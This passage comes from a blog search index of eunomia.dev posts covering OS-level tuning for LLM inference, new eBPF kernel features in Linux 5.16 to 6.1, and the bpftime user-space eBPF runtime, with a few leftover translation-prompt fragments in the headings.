slice.</p> </li> </ul> <p>In summary, OS-level optimizations must not compromise isolation and security. The ideal is to have performance isolation (each workload gets predictable performance unaffected by others) and security isolation (no workload can access or degrade others\u2019 data or resources). Achieving both is non-trivial: stronger isolation (like VMs) can introduce performance overhead, while pure performance tuning (like disabling certain protections) can weaken security. Current best practices tend to use container orchestration with Kubernetes or similar to schedule AI jobs with quotas, and use monitoring to prevent any job from starving others. In research, if you develop a custom OS feature (say a new scheduler), testing it in a multi-tenant scenario and checking that one heavy inference doesn't steal CPU cycles from a neighbor beyond what\u2019s intended is important. Additionally, any kernel changes should be scrutinized for security (e.g., avoid introducing an exploitable bug in a custom module).</p>"},{"location":"blog/2025/02/18/os-level-challenges-in-llm-inference-and-optimizations/#os-customization-for-ai-best-practices-and-emerging-research","title":"OS Customization for AI: Best Practices and Emerging Research","text":"<p>Given the challenges above, there is a growing body of work on customizing and tuning operating systems specifically for AI and ML workloads. This ranges from simple configuration tweaks to whole new OS architectures. Here we highlight some best practices in use today, as well as emerging research directions:</p> <ul> <li> <p>Tuning and Configuring Linux for AI: Many practitioners have a checklist of Linux settings to optimize performance for deep learning. These include enabling transparent huge pages (so the OS automatically uses 2 MB pages for large allocations, reducing page management overhead), or even using explicit huge pages for GPU memory buffers. Huge pages not only reduce the number of page faults, but also improve TLB (Translation Lookaside Buffer) efficiency \u2013 for memory-heavy workloads like LLMs, this can give a measurable boost. Other settings involve CPU scaling: disabling frequency scaling and C-states (to keep processors at a consistent high frequency), and pinning threads to specific cores (using <code>taskset</code> or <code>cset shield</code> on Linux). Isolating cores using the <code>isolcpus</code> kernel parameter or CPU sets ensures the OS doesn\u2019t schedule random tasks on the cores reserved for inference. Additionally, turning off Turbo Boost in some cases can reduce jitter (more consistent performance at a slightly lower peak frequency is sometimes preferable for latency predictability). On the I/O side, using fast NVMe SSDs and high-performance filesystems (ext4 or XFS with proper mount options) for loading models is recommended, and if using network, configuring adequate kernel network buffers and perhaps enabling features like busy polling to reduce latency. These are all configuration-level best practices that do not require new code but are important to get right.</p> </li> <li> <p>HPC and Real-Time Kernel Patches: The high-performance computing (HPC) community has long dealt with OS interference issues, and some of their solutions carry over to AI. For instance, the Linux RT (Real-Time) kernel patch can be applied to get more deterministic scheduling (preempt_rt patch makes the kernel more preemptible). HPC-oriented Linux distributions or configs (e.g., those used in supercomputers) often minimize OS background activities \u2013 running a daemonless or low-service OS on compute nodes (sometimes called a compute node kernel). This idea is appearing in AI clusters as well: specialized deployment where nodes running critical inference have a pared-down OS image to reduce noise. Some cloud providers are exploring stripped-down OS or unikernels for inference serving, especially at the edge, to maximize performance. An example is using AWS Firecracker microVMs to run models in a lightweight virtual machine that has a very small OS footprint (this improves security isolation and keeps the \"OS noise\" low, while still launching quickly like containers). </p> </li> <li> <p>Ghost and Advanced Schedulers: We mentioned Google\u2019s ghOSt framework earlier as a way to offload scheduling decisions to user space. This is cutting-edge research that effectively turns scheduling policy into something pluggable. With ghOSt, Google demonstrated implementing Linux\u2019s default CFS scheduler in eBPF as a proof-of-concept, then showed you can implement completely different policies as well (8) (8: Google's Ghost Look Very Appealing For Kernel Scheduling From User-Space &amp; eBPF Programs - Phoronix). For AI, one could implement a policy that, say, prioritizes inference tasks over background data-processing tasks during business hours, then switches at night \u2013 all without rebooting or changing the kernel binary, just by swapping out the ghOSt scheduling agent. This separation of mechanism (in kernel) and policy (in user-space or eBPF) is a trend that could benefit AI workload scheduling greatly. It allows rapid experimentation with scheduling algorithms tailored to AI (for example, scheduling based on GPU readiness or batching state). Academic research is also looking at learning-based scheduling, where an ML model (ironic, but yes) learns to predict the best scheduling decisions. With eBPF, such a model could run in a limited form in the kernel or guide a user-space scheduler.</p> </li> <li> <p>AI-optimized Operating Systems: There\u2019s a vision of developing entire operating systems optimized for AI. While general-purpose OSes (Linux/Windows) are still the base, projects are investigating what an \u201cAI-first\u201d OS might look like. This could include first-class support for accelerators (better than today\u2019s driver model), more direct user control over huge memory allocations, and perhaps new abstractions (like treating a sequence of GPU kernels and CPU ops as one schedulable unit to improve scheduling coherence). Some research has proposed treating neural network execution as an OS-managed pipeline, co-scheduling CPU and GPU together to minimize idle times. Others have looked at allocation of resources across distributed systems \u2013 effectively an OS for the datacenter that can allocate GPUs, storage, etc., to AI tasks on demand (Kubernetes does this at a higher level; research is ongoing to make it more fine-grained and efficient). There are also efforts like openEuler (by Huawei) which explicitly list support for LLM inference in their kernel features (9) (9) \u2013 indicating that mainstream OS vendors are paying attention to AI workload needs. In openEuler\u2019s case, they highlight optimizations for frameworks like llama.cpp on CPUs (quantization support, optimized memory usage) and various scheduling/QoS improvements in the kernel (9) (9: key-features | openEuler documentation | v24.03_LTS).</p> </li> <li> <p>Kernel Bypass and User-space Networking/Storage: A best practice from both HPC and high-frequency trading that is relevant: bypassing the OS kernel for certain operations to cut down latency. For instance, using DPDK (Data Plane Development Kit) for networking can allow an inference server to send/receive data from the NIC directly in user-space, avoiding kernel network stack overhead. Similarly, using SPDK (Storage Performance Dev Kit) allows user-space high-performance access to NVMe drives. If an inference service has extreme throughput requirements (say it streams high volumes of data), these techniques can help. They do require dedicating hardware (NIC/SSD) to the process and careful management of drivers. Another bypass approach is memory-mapped I/O combined with busy-wait polling, which can, for example, let a user-space thread poll a memory location that the NIC writes to (via RDMA or other mechanisms), again avoiding interrupts. These are advanced optimizations that trade CPU cycles for lower latency by avoiding kernel scheduling.</p> </li> <li> <p>Emerging Memory Systems (CXL and others): On the horizon is new hardware like CXL (Compute Express Link) which allows expansion of memory transparently across devices or even nodes. OS support for such technologies will be crucial for AI, as they enable having huge pools of memory (possibly slower, but large) accessible to CPUs/GPUs. This could change how inference engines handle models that don\u2019t fit in VRAM: instead of swapping to SSD, they might swap to CXL-attached memory which is faster. The OS will manage this like NUMA memory or separate tiers. We might see kernel policies to automatically move rarely-used model weights to CXL memory and keep active ones in local memory. Research is ongoing in tiered memory management, some of which is inspired by AI workloads that have an order-of-magnitude difference in \u201chot\u201d vs \u201ccold\u201d data usage.</p> </li> </ul> <p>Overall, current best practices revolve around tuning existing OS parameters, while research is pushing towards more flexible and intelligent OS behavior tailored to AI. For someone leading a research project, it\u2019s wise to build on those best practices first (for a strong baseline) and then identify gaps that novel techniques can fill. For example, one might start by applying known tweaks (huge pages, CPU pinning, etc.), measure remaining bottlenecks, then prototype an eBPF program or custom scheduler to address a specific issue (say, uneven GPU utilization due to OS scheduling). The combination of established tuning and novel customization can yield impressive results \u2013 as seen in some case studies where throughput of LLM serving was improved significantly by eliminating scheduling inefficiencies (6) (6: MLSys @ WukLab - Can Scheduling Overhead Dominate LLM Inference Performance? A Study of CPU Scheduling Overhead on Two Popular LLM Inference Systems).</p>"},{"location":"blog/2025/02/18/os-level-challenges-in-llm-inference-and-optimizations/#practical-considerations-for-implementing-os-level-optimizations","title":"Practical Considerations for Implementing OS-Level Optimizations","text":"<p>When embarking on OS-level optimization as part of a research project, there are important practical points to keep in mind. Implementing kernel changes or eBPF programs is quite different from user-space programming, and ensuring that your optimizations are effective and safe requires careful planning:</p> <ul> <li> <p>Measuring Baselines and Bottlenecks: Before changing anything, set up thorough profiling of the status quo. Use tools like <code>perf</code> (for CPU profiling, cache misses, branch misses), <code>iostat</code>/<code>vmstat</code> (for I/O and memory stats), and <code>perfetto</code> or NVIDIA Nsight if GPUs are involved. Identify where the time is going: Is the CPU fully utilized or often waiting? Are there many syscalls or page faults? Baseline measurements will guide you to the most fruitful areas to optimize. It will also provide a way to quantify improvements (or regressions) after you make OS-level changes. Without good measurements, OS tweaks can be shooting in the dark.</p> </li> <li> <p>Incremental and Isolated Changes: OS-level changes can have wide-ranging effects, so try to make one change at a time and test. For example, if you want to experiment with a custom scheduler, you might start by isolating the inference process to certain CPUs and writing an eBPF program to monitor its scheduler events, before actually altering scheduling decisions. This way, if something goes wrong (e.g., performance drops or the system becomes unstable), you can pinpoint the cause. Working incrementally also means you\u2019ll build understanding of the system piece by piece, which is valuable in research write-ups.</p> </li> <li> <p>Use of eBPF vs. Kernel Module: Decide whether your optimization can be done with eBPF or needs a full kernel module/patch. eBPF has the advantage that it doesn\u2019t require rebuilding the kernel or even stopping the system \u2013 you can load and unload eBPF programs at runtime. It\u2019s great for prototyping ideas like \u201cwhat if we prioritize this process in the scheduler\u201d or \u201clet\u2019s capture an event and adjust something.\u201d However, eBPF is sandboxed and limited (no loops or complex logic unless you use BPF ringbuffers/maps to communicate with user-space). If your idea requires heavy logic or direct modification of core kernel code paths, you might need to write a kernel module or patch. That in turn means you\u2019ll need a development environment for compiling the kernel and a way to deploy it (perhaps a VM for safety). For a research project, using eBPF is often a faster path to iterate on ideas; only dive into kernel patches if absolutely necessary.</p> </li> <li> <p>Stability and Reproducibility: Running custom kernel code can cause crashes if there\u2019s a bug. It\u2019s wise to test on non-production machines and have remote access or a fallback in case the system becomes unresponsive. Using virtual machines or containers (for eBPF, you can use unprivileged containers to some extent, but for loading programs you often need privileges) can contain any accidents. Also, document the exact kernel version and configuration you are using \u2013 OS optimizations might behave differently on different kernel versions. If you present research results, others might need to reproduce your environment. Where possible, use widely-available platforms (e.g., a mainstream Linux distribution, with your customizations on top) rather than a totally custom OS, so that your results generalize better.</p> </li> <li> <p>Interaction Effects: Keep in mind that various optimizations can interact. For example, if you pin a process to a CPU core (to avoid scheduler latency) but that core handles interrupts from a network card, you might actually get worse interference (because now your inference thread is getting interrupted by network IRQs it can\u2019t escape). In this case, you\u2019d also need to redirect interrupts (via /proc/IRQ affinity settings) off that core. Similarly, enabling huge pages could backfire if the memory becomes too fragmented to allocate them \u2013 causing the OS to spend extra time compacting memory. So, watch out for side effects. The best approach is holistic: consider CPU, memory, and I/O together. Often an improvement in one area can surface a new bottleneck in another (classic example: speeding up CPU scheduling might make the workload now IO-bound, or vice versa). As you iterate, keep checking the whole system performance, not just one metric.</p> </li> <li> <p>Security and Permissions: If your research setup is in a shared lab environment or on cloud VMs, obtaining the ability to change kernel settings or load eBPF might require coordination. On a personal machine you have free rein, but on a shared cluster you may need admin rights. Always communicate with system administrators if you\u2019re doing kernel experiments on shared infrastructure \u2013 inadvertently crashing a shared machine or opening a security hole would not be good! In cloud environments, features like eBPF may be restricted; however, some cloud providers allow custom kernel images if you use bare metal instances. Plan for the environment accordingly.</p> </li> <li> <p>Leverage Existing Frameworks: You don\u2019t have to build everything from scratch. If your aim is to create a custom scheduler, consider using ghOSt (as it already provides a lot of infrastructure to intercept scheduling). If you want to manage memory, look at Linux\u2019s cgroup v2 interface for memory (it allows setting memory limits, protections, NUMA policies, etc., which you could control programmatically). For networking and I/O, frameworks like io_uring (for asynchronous IO) provide a more efficient interface than traditional system calls \u2013 maybe your project can integrate that. By using existing tools, you reduce the amount of low-level code you need to write, and you can focus on the novel aspect (like the policy or strategy). The Linux kernel community and cloud providers are actively working on features for isolating workloads (for example, there\u2019s ongoing development on better isolation for noisy neighbors, and new cgroup controllers). Keeping an eye on these developments can spark ideas or provide ready-made solutions to part of your problem.</p> </li> <li> <p>Evaluating Results Properly: When you implement an OS-level optimization, evaluate it under realistic conditions. It\u2019s possible to inadvertently create a scenario that benefits a micro-benchmark but not a real workload. For example, if you evaluate CPU scheduling changes with a single-threaded, CPU-bound loop, you might see a huge win; but an actual LLM inference might be multithreaded and also waiting on GPU, in which case the CPU scheduler tweak might not matter as much. So, test with actual model inference runs, possibly with varying batch sizes or sequence lengths to see how your OS changes behave. Also, evaluate not just raw throughput but tail latency (95th/99th percentile latencies) if real-time response is important \u2013 OS optimizations often have the biggest effect on those tail cases (reducing jitter). </p> </li> <li> <p>Documentation and Further Investigation: Finally, treat each finding as a piece of a bigger puzzle. OS-level behavior can be complex; you might fix one bottleneck and uncover another. Document everything: \u201cWe enabled huge pages and saw a 5% gain in throughput, but CPU utilization dropped, indicating we became IO-bound \u2013 next, we addressed IO by doing X\u2026\u201d This narrative is valuable for a research report. It also points to further investigation: maybe your project will solve some issues but not all, and that\u2019s fine \u2013 noting what remains (e.g., \u201cGPU utilization is still only 70%, likely due to framework overhead \u2013 could be a target for future OS-runtime co-design\u201d) shows you understand the landscape. In particular, areas like kernel-user co-design, smarter interrupts, and integration with specialized hardware (DPUs, smart NICs) are ripe for future research, and you can suggest those as follow-ups.</p> </li> </ul> <p>By considering these practical aspects, you increase the chances that your OS-level optimizations will yield meaningful, reproducible improvements and that your research insights will be applicable in real-world scenarios. The interplay between LLM inference and operating systems is an exciting frontier \u2013 with careful experimentation and design, there is ample opportunity to push the boundaries of performance while maintaining robust isolation and security.</p> <p>Share on  Share on </p>"},{"location":"blog/2023/04/11/ebpf-advanced-overview-of-new-kernel-features/","title":"eBPF Advanced: Overview of New Kernel Features","text":"<p>The Linux kernel primarily released versions 5.16-5.19, 6.0, and 6.1 in 2022, each of which introduced numerous new features for eBPF. This article will provide a brief introduction to these new features, and for more detailed information, please refer to the corresponding link. Overall, eBPF remains one of the most active modules in the kernel, and its functionality is still rapidly evolving. In a sense, eBPF is rapidly evolving towards a complete kernel-level programmable interface.</p>"},{"location":"blog/2023/04/11/ebpf-advanced-overview-of-new-kernel-features/#bpf-kfuncs","title":"BPF kfuncs","text":"<p>The BPF subsystem exposes many aspects of kernel internal algorithms and data structures, which naturally leads to concerns about maintaining interface stability when the kernel changes. For a long time, BPF's stance on not providing interface stability guarantees to user space has been somewhat problematic. In the past, kernel developers found themselves having to maintain interfaces that were not intended to be stable. Now the BPF community is starting to consider what it might mean to provide explicit stability guarantees for at least some of its interfaces.</p> <p>BPF allows programs loaded from user space to be attached to any of a large number of hooks and run in the kernel\u2014after the subsystem's verifier has concluded that those programs won't harm the system. A program gains access to kernel data structures provided by the hook to which it is attached. In some cases, a program can modify those data structures directly, thereby directly affecting the kernel's operation. In other cases, the kernel will take action based on values returned by a BPF program, such as allowing or disallowing a particular operation.</p> <p>There are also two mechanisms by which the kernel can provide BPF programs with additional functionality. Helper functions have been around since the extended BPF era and are special functions written to be made available to BPF programs. A mechanism called kfuncs is relatively new and allows any kernel function to be made available to BPF, potentially with some restrictions. Kfuncs are simpler and more flexible, and if they were implemented first, it seems unlikely that anyone would have added helpers later. That said, kfuncs have an important limitation in that they can only be accessed by JIT-compiled BPF code, so they are not available on architectures lacking JIT support (which currently includes 32-bit Arm and RISC-V, although patches adding support for these are in development). Each kfunc provides some useful functionality to BPF programs but also exposes some aspects of how the kernel works.</p> <ul> <li>Reconsidering BPF ABI stability: Link</li> <li>Documentation/bpf: Add a description of \"stable kfuncs\" Link</li> </ul>"},{"location":"blog/2023/04/11/ebpf-advanced-overview-of-new-kernel-features/#bloom-filter-map-516","title":"Bloom Filter Map: 5.16","text":"<p>Bloom filters are space-efficient probabilistic data structures used to quickly test whether an element is a member of a set. In a bloom filter, false positives are possible, but false negatives are not.</p> <p>This patchset includes benchmarking of bloom filters with configurable numbers of hash values and entries. These benchmarks roughly indicate that, on average, using 3 hash functions is one of the ideal choices. When comparing the bloom filter with 3 hash values used in hashmap lookups to hashmap lookups without bloom filters, the lookup with the bloom filter is approximately 15% faster for 50,000 entries, 25% faster for 100,000 entries, 180% faster for 500,000 entries, and 200% faster for 1 million entries.</p> <ul> <li>BPF: Implement bloom filter map Link</li> </ul>"},{"location":"blog/2023/04/11/ebpf-advanced-overview-of-new-kernel-features/#compile-once-run-everywhere-linux-517linux-517-added-a-new-feature-called-compile-once-run-everywhere-co-re-for-ebpf-which-greatly-simplifies-the-complexity-of-handling-multi-version-kernel-compatibility-and-loop-logic-in-ebpf-programs","title":"Compile Once \u2013 Run Everywhere: Linux 5.17\".Linux 5.17 added a new feature called Compile Once - Run Everywhere (CO-RE) for eBPF, which greatly simplifies the complexity of handling multi-version kernel compatibility and loop logic in eBPF programs","text":"<p>The CO-RE project of eBPF relies on the debugging information provided by BPF Type Format (BTF) and goes through the following four steps to enable eBPF programs to adapt to different versions of the kernel:</p> <ul> <li>First, the bpftool provides a tool to generate header files from BTF, eliminating the need for kernel header files.</li> <li>Second, by rewriting the access offsets in the BPF code, the problem of different data structure offsets in different kernel versions is resolved.</li> <li>Third, the modifications of data structures in different kernel versions are pre-defined in libbpf to address the issue of incompatible data structures in different kernels.</li> <li>Fourth, libbpf provides a series of library functions for detecting kernel features, solving the problem of eBPF programs needing to perform different behaviors in different kernel versions. For example, you can use bpf_core_type_exists() and bpf_core_field_exists() to check if kernel data types and member variables exist, and use the format extern int LINUX_KERNEL_VERSION __kconfig to query kernel configuration options.</li> </ul> <p>With these methods, CO-RE allows eBPF programs to be compiled in the development environment and distributed to machines with different kernel versions, without the need to install various development tools and kernel header files on the target machines. Therefore, the Linux kernel community recommends that all developers use CO-RE and libbpf to build eBPF programs. In fact, if you have looked at the source code of BCC, you will find that BCC has already migrated many tools to CO-RE.</p> <ul> <li>Detailed explanation of eBPF multi-kernel version compatibility: https://time.geekbang.org/column/article/534577</li> <li>BPF CO-RE reference guide: https://nakryiko.com/posts/bpf-core-reference-guide/</li> </ul>"},{"location":"blog/2023/04/11/ebpf-advanced-overview-of-new-kernel-features/#helper-function-bpf_loop-517","title":"Helper function bpf_loop(): 5.17","text":"<p>One of the main features of the extended BPF virtual machine is the built-in validator in the kernel, which ensures that all BPF programs can run safely. However, BPF developers often have mixed feelings about the validator; although it can catch many problems before they occur, it is also difficult to satisfy. Comparing it to a well-meaning but rule-constrained and picky bureaucratic organization is not entirely wrong. The bpf_loop() proposal by Joanne Koong is intended to make a type of loop structure more pleasing to the BPF bureaucrats.</p> <p>In short, that is the purpose of Koong's patch. It adds a new helper function that can be called from BPF code.</p> <pre><code>    long bpf_loop(u32 iterations, long (*loop_fn)(u32 index, void *ctx),\n          void *ctx, u64 flags);\n</code></pre> <p>A call to bpf_loop() will result in iterative calls to loop_fn(), with the iteration count and the passed ctx as parameters. The flags value is currently unused and must be zero. loop_fn() typically returns 0; returning 1 will immediately end the iteration. No other return values are allowed.</p> <p>Unlike bpf_for_each_map_elem(), which is limited by BPF map size, the number of iterations for bpf_loop() can be as high as 1&lt;&lt;23 = 8388608 (over 8 million); greatly expanding the range of applications for bpf_loop(). However, bpf_loop() is not limited by the number of BPF instructions (1 million) because the loop occurs inside the bpf_loop() helper function.</p> <ul> <li>A different approach to BPF loops: https://lwn.net/Articles/877062/</li> <li>eBPF Talk: Practical experience with loops: https://mp.weixin.qq.com/s/neOVsMNVWFbwpTSek-_YsA</li> </ul>"},{"location":"blog/2023/04/11/ebpf-advanced-overview-of-new-kernel-features/#bpf_link_type_kprobe_multi-518","title":"BPF_LINK_TYPE_KPROBE_MULTI: 5.18","text":"<p>This patch set adds a new link type called BPF_TRACE_KPROBE_MULTI, which connects kprobe programs using the fprobe API [1] created by Masami. The fprobe API allows probes to be attached to multiple functions at once and works very fast because it operates on top of ftrace. On the other hand, it restricts the probe points to function entry or return.</p> <ul> <li>bpf: Add kprobe multi link: https://lwn.net/Articles/885811/</li> </ul>"},{"location":"blog/2023/04/11/ebpf-advanced-overview-of-new-kernel-features/#dynamic-pointers-and-type-pointers-519instructions-translate-the-following-chinese-text-to-english","title":"Dynamic Pointers and Type Pointers: 5.19.Instructions: Translate the following Chinese text to English","text":"<p>while maintaining the original formatting: \"All memory accesses in the BPF program use validators for security static checks, and validators perform comprehensive analysis of the program before allowing it to run. While this enables BPF programs to run safely in kernel space, it restricts how the program can use pointers. Until recently, one such restriction was that the size of the memory region referenced by a pointer in a BPF program had to be statically known when loading the BPF program. Joanne Koong recently introduced a patchset that enhances BPF to support loading programs with pointers to dynamically sized memory regions.</p> <p>Koong's patchset adds support for accessing dynamically sized memory regions in BPF programs, which includes a new feature called dynptrs. The main idea behind dynptrs is to associate pointers to dynamically sized data regions with validators and some metadata used by BPF helper functions, to ensure that access to that region is valid. Koong's patchset creates this association in a newly defined type called struct bpf_dynptr. This structure is opaque to BPF programs.</p> <ul> <li>https://mp.weixin.qq.com/s/rz4pd41Y-Cet5YVSAKmCRw</li> </ul>"},{"location":"blog/2023/04/11/ebpf-advanced-overview-of-new-kernel-features/#usdt-519","title":"USDT: 5.19","text":"<p>Static tracepoints, also known as User-Level Statically Defined Tracing (USDT) probes, are specific locations of interest in an application that a tracer can mount to check code execution and data. They are explicitly defined by developers in the source code and are usually enabled at compile time with flags such as \"--enable-trace\". The advantage of static tracepoints is that they do not change frequently: developers typically maintain a stable static trace ABI, so tracing tools work across different versions of an application, which is useful, for example, when upgrading a PostgreSQL installation and experiencing performance degradation.</p> <ul> <li>eBPF Overview Part 5: Tracing User Processes: https://www.ebpf.top/post/ebpf-overview-part-5/</li> <li>Using user-space tracepoints with BPF: https://lwn.net/Articles/753601/</li> </ul>"},{"location":"blog/2023/04/11/ebpf-advanced-overview-of-new-kernel-features/#bpf-panic-61","title":"BPF panic: 6.1","text":"<p>One of the key selling points of the BPF subsystem is that loading BPF programs is safe: the BPF verifier ensures that the program cannot harm the kernel before allowing it to load. As more features are offered to BPF programs, this guarantee may lose some of its strength, but even so, seeing Artem Savkov's proposal to introduce a BPF helper explicitly designed to crash the system may come as a bit of a surprise. If merged in a form resembling the current patchset, it would be a harbinger of a new era in which, at least in certain cases, BPF programs are allowed to deliberately cause havoc.</p> <p>As Savkov points out, one of the primary use cases for BPF is kernel debugging, and this task is often helped by having a timely crash dump available. By making the panic() function of the kernel available to BPF programs, Savkov attempts to combine these two and allow BPF programs to crash and create crash dumps when certain conditions indicating the problems that developers are looking for are detected. Savkov seems not to be the only one who wants this ability; Jiri Olsa has reported receiving requests for such functionality as well.</p> <ul> <li>The BPF panic function: https://lwn.net/Articles/901284/</li> </ul>"},{"location":"blog/2023/04/11/ebpf-advanced-overview-of-new-kernel-features/#bpf-memory-allocator-linked-list-61","title":"BPF Memory Allocator, Linked List: 6.1","text":"<p>This series introduces BPF objects defined by users in the BTF type of the program. This allows BPF programs to allocate their own objects, build their own object hierarchy, and flexibly construct their own data structures using the basic building blocks provided by the BPF runtime.</p> <p>Then, we introduce support for singly-owned BPF linked lists. They can be placed in BPF maps or allocated objects and hold these allocated objects as elements. It works as an intrusive set. The aim of doing this is to make the allocated objects part of multiple data structures in the future.</p> <p>The ultimate goal of this patch and future patches is to allow people to do some limited kernel-style programming in BPF C and allow programmers to flexibly construct their own complex data structures from basic building blocks.</p> <p>The key difference is that these programs are verified, safe, preserve runtime integrity of the system, and have been proven to have no bugs.</p> <p>Specific features include:</p> <ul> <li>Allocating objects</li> <li>bpf_obj_new, bpf_obj_drop to allocate and release objects</li> <li>Singly-owned BPF linked lists</li> <li>Supporting them in BPF maps</li> <li>Supporting them in allocated objects</li> <li>Global spinlocks</li> <li>Spinlocks in allocated objects.</li> </ul> <p>Reference: https://lwn.net/Articles/914833/</p>"},{"location":"blog/2023/04/11/ebpf-advanced-overview-of-new-kernel-features/#user-ring-buffer-61","title":"User Ring Buffer 6.1","text":"<p>This patchset defines a new map type, BPF_MAP_TYPE_USER_RINGBUF, which provides single-user space producer/single-kernel consumer semantics on top of a ring buffer. In addition to the new map type, it adds an auxiliary function called bpf_user_ringbuf_drain() that allows a BPF program to specify a callback with the following signature, to which the samples are published by the helper function.</p> <p><code>c\". format: Return only the translated content, not including the original text.</code> void (struct bpf_dynptr dynptr, void context).</p> <p>Then the program can safely read samples from dynptr using the bpf_dynptr_read() or bpf_dynptr_data() helper functions. Currently, there are no available helper functions to determine the size of the samples, but one can easily be added if needed.</p> <p>libbpf has also added some corresponding APIs:</p> <pre><code>struct ring_buffer_user *\nring_buffer_user__new(int map_fd,\n                      const struct ring_buffer_user_opts *opts);\nvoid ring_buffer_user__free(struct ring_buffer_user *rb);\nvoid *ring_buffer_user__reserve(struct ring_buffer_user *rb,\n        uint32_t size);\nvoid *ring_buffer_user__poll(struct ring_buffer_user *rb, uint32_t size,\n           int timeout_ms);\nvoid ring_buffer_user__discard(struct ring_buffer_user *rb, void *sample);\nvoid ring_buffer_user__submit(struct ring_buffer_user *rb, void *sample);\n</code></pre> <ul> <li>bpf: Add user-space-publisher ring buffer map type: https://lwn.net/Articles/907056/</li> </ul> <ul> <li>This article was completed by the eunomia-bpf team and we are exploring the toolchains and runtimes integrating eBPF and WebAssembly: https://github.com/eunomia-bpf/wasm-bpf</li> <li>And trying to build some interesting use cases on top of Wasm and eBPF.</li> </ul> <p>Share on  Share on </p>"},{"location":"blog/2023/11/11/bpftime-extending-ebpf-from-kernel-to-user-space/","title":"bpftime: Extending eBPF from Kernel to User Space","text":"<p>Yu Sheng Zheng, Yu Tong</p> <p>eBPF is a revolutionary technology that originated in the Linux kernel, enabling sandboxed programs to run within the operating system's kernel. It is used to safely and efficiently extend the kernel's capabilities without altering its source code or loading kernel modules.</p> <p>In this blog, we are excited to introduce a new open-source user-space eBPF runtime: https://github.com/eunomia-bpf/bpftime. bpftime further expands the capabilities of eBPF, allowing existing eBPF tools and applications, such as BCC tools, bpftrace, Deepflow, etc., to run in non-privileged user space without any code modifications, while using the same libraries and toolchains as kernel eBPF.</p> <p>bpftime not only provides dynamic tracing or extension mechanisms like Uprobe and system call tracepoints, but also offers an order of magnitude performance improvement over kernel Uprobe. Moreover, like kernel eBPF, it requires no manual code instrumentation or process restarts. bpftime supports inter-process eBPF maps through user-space shared memory, while being compatible with kernel eBPF maps, enabling seamless operations with kernel eBPF infrastructure. Additionally, it includes high-performance LLVM JIT/AOT compilers for various architectures, as well as a lightweight JIT and interpreter for x86. Through performance data and real-world examples, we will demonstrate how bpftime can be effective in the real world and provide insights into its future development. We hope bpftime will bring unprecedented performance and flexibility to system monitoring, analysis, and extension. We also introduced the design and implementation of bpftime at the Linux plumbers 23 conference[2].</p>"},{"location":"blog/2023/11/11/bpftime-extending-ebpf-from-kernel-to-user-space/#ebpf-system-extension-from-kernel-to-user-space","title":"eBPF: System Extension from Kernel to User Space","text":"<p>eBPF (extended Berkeley Packet Filter) has evolved from a simple network packet filtering tool into a versatile system-level extension technology. Since the inception of BPF in the 1990s, eBPF has significantly enhanced its functionality through an expanded instruction set and direct interaction with kernel data structures. After joining the Linux kernel in 2014, eBPF became a powerful bytecode engine, widely used in performance analysis, security policies, and other areas. With the growing complexity of computing environments, eBPF's real-time data collection and analysis capabilities have become crucial in modern computing, especially in traffic control, load balancing, and security policies.</p> <p>Although eBPF was initially designed for the kernel, its tremendous potential in user space, coupled with the kernel's GPL LICENSE restrictions, led to the development of early user-space eBPF runtimes like ubpf[3] and rbpf[4]. These runtimes allowed developers to execute eBPF bytecode outside the kernel, breaking free from GPL license restrictions and offering a more intuitive and convenient debugging environment. However, writing programs for ubpf and rbpf might require a specific, not fully kernel-compatible toolchain, and they only had limited single-threaded hash maps implementations, making it difficult to run actual eBPF programs. Additionally, ubpf and rbpf are essentially eBPF bytecode virtual machines that still require glue code to compile and link with other user-space programs for practical use, and they did not offer dynamic tracing functionality.</p> <p>In practice, user-space eBPF has been explored and applied in fields like network processing, blockchain, and security. For example, Oko and DPDK eBPF support demonstrate the flexibility and performance advantages of eBPF in network data processing. The Solana project utilized eBPF to implement a JIT compiler, supporting the execution of blockchain smart contracts. The eBPF for Windows project extended eBPF functionality beyond Linux, showcasing its potential for cross-platform compatibility. These applications not only demonstrate eBPF's powerful system extension capabilities but also highlight its significance and wide applicability in the modern computing domain. For further discussion, refer to our previous blog: https://eunomia.dev/blogs/userspace-ebpf/.</p>"},{"location":"blog/2023/11/11/bpftime-extending-ebpf-from-kernel-to-user-space/#why-we-need-bpftime","title":"Why We Need bpftime","text":"<p>Due to the core role of operating system kernels and the high demands for stability and security, innovation and evolution in operating system kernels tend to be slow. This is the original intention behind eBPF: to extend the kernel's functionality without changing its source code, thereby bringing more innovative application scenarios[5]. This is also the impact we hope bpftime will have: exploring more development possibilities with the safety and ecosystem brought by eBPF, without changing user-space program code, and compensating for the potential shortcomings of current kernel-space eBPF and other user-space extension solutions.</p>"},{"location":"blog/2023/11/11/bpftime-extending-ebpf-from-kernel-to-user-space/#limitations-of-kernel-space-implementation-of-user-space-tracing-uprobe-and-system-call-tracing","title":"Limitations of Kernel-Space Implementation of User-Space Tracing (Uprobe) and System Call Tracing","text":"<p>Uprobe is a powerful user-level dynamic tracing mechanism that allows developers to perform dynamic instrumentation in user-space programs, such as at function entry points, specific code offsets, and function return points. This technology is implemented by setting breakpoints at designated locations, such as using the int3 instruction on x86 architecture. When the execution flow reaches this point, the program traps into the kernel, triggering an event, then executing a predefined probe function, and finally returning to user-space to continue execution. This dynamic tracing method can trace and instrument all processes executing a specific file across the system, allowing for the collection of critical data for performance analysis and fault diagnosis without modifying code, recompiling, or restarting processes.</p> <p>However, since the eBPF virtual machine executes in kernel mode, the current Uprobe implementation introduces two context switches in the kernel, causing significant performance overhead, especially impacting performance in latency-sensitive applications. As shown in the diagram, Uprobe's overhead is nearly ten times that of Kprobe[5]. On the other hand, Uprobe is currently limited to tracing and cannot modify the execution flow or return values of user-space functions, limiting its use cases to code extension, hot patching, defect injection, etc. Despite this, Uprobe is still widely used in production environments for its non-intrusive user-space functionality tracing, such as tracing user-space protocols like SSL/TLS and HTTP2, monitoring memory allocation and leaks, analyzing garbage collection and language runtimes, and tracking the creation and recycling of coroutines, among other scenarios.</p> <p></p> <p>For system call tracepoints, since they are globally visible, additional filtering is required for specific process tracing, such as filtering based on pid, cgroup, etc., in eBPF[6], which also brings some additional overhead to other processes that do not need to be traced.</p>"},{"location":"blog/2023/11/11/bpftime-extending-ebpf-from-kernel-to-user-space/#limitations-of-kernel-space-ebpf-in-terms-of-security-and-extensibility","title":"Limitations of Kernel-Space eBPF in Terms of Security and Extensibility","text":"<p>eBPF running in kernel mode has its limitations in terms of security and extensibility. On one hand, eBPF programs need to run in kernel mode, meaning they require root privileges, thereby increasing the attack surface and potential risks, such as container escape. Moreover, vulnerabilities in eBPF itself can lead to security issues at the kernel level. On the other hand, 